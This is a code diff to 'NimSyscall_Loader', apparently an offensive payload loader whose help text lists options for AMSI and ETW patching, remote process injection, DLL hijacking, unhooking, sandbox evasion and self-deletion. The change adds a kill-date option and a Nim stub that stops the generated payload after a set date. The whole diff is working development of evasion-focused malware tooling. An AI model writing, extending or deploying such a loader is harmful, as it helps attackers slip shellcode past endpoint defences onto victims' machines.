@@ -68,7 +68,7 @@ let helpmenu = """
 NimSyscall_Loader v 2.2
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --perfectdllhijack --noNimMain --clone=<dllToClone> --dllProxy --payloadFunction=<functionName> --noRandom --mutexoneshot --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --threadlessthread --poolparty=<number> --conhostinject --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --killdate=<yyyymmdd> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --perfectdllhijack --noNimMain --clone=<dllToClone> --dllProxy --payloadFunction=<functionName> --noRandom --mutexoneshot --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --threadlessthread --poolparty=<number> --conhostinject --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -86,6 +86,7 @@ Options:
   --environmentalKey value    Use environmental key (domain,username) to encrypt with
                               domain -> enumerate the current domain on runtime and use that as key
                               username -> enumerate the current username on runtime and use that as key
+  --killdate yyyymmdd    Specify an date, after which the payload won't get executed anymore
   --output filename    Filename for encrypted exe/dll
   --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
   --metadata    Set custom resource file information (cmd icon, CMD description, ntdll metadata for dlls by default)
@@ -285,6 +286,7 @@ var
     dnsdomain: string = ""
     customKey: bool = false
     environmentalKey: bool = false
+    killdate: string = ""
     environmentalDomain: bool = false
     environmentalUsername: bool = false
     environmentalcheckfmt: string = ""
@@ -405,6 +407,10 @@ if args["--environmentalKey"]:
       environmentalDomain = true
     if(m.contains("username")):
       environmentalUsername = true
+
+if args["--killdate"]:
+  let killdatestring = args["--killdate"]
+  killdate = fmt"{killdatestring}"
 
 if args["--key"]:
   let keyname = args["--key"]
@@ -2342,6 +2348,27 @@ when defined(logFile):
 
 """
 
+
+let killdateStub = """
+
+
+proc checkDate() =
+  var killdate = obf("KILLDATEREPLACE")  # yyyymmdd format
+  var now: SYSTEMTIME
+  GetLocalTime(addr now)
+  var date = fmt"{now.wYear}{now.wMonth:02}{now.wDay:02}"  # yyyymmdd format
+  echo date
+  echo killdate
+  if date >= killdate:
+    # MessageBoxA(0, cast[LPCSTR](cstring("This program has expired!")), cast[LPCSTR](cstring("Error")), MB_OK)
+    quit(1)
+  # else:
+    # MessageBoxA(0, cast[LPCSTR](cstring("This program is still valid!")), cast[LPCSTR](cstring("Success")), MB_OK)
+
+checkDate()
+
+"""
+
 let macPayloadStub = fmt"""
 
 
@@ -3946,6 +3973,11 @@ if(pump):
         if (m == "reputation"):
             echo "[*] Adding reputation"
             stub.add(genTrustedwords(rand(3500..6200)))
+
+if(killdate != ""):
+    var killdateStubnew = killdateStub.replace("KILLDATEREPLACE", killdate)
+    stub.add(killdateStubnew)
+
 
 if(antidebug):
     stub.add(AntiDebugPEBStub)
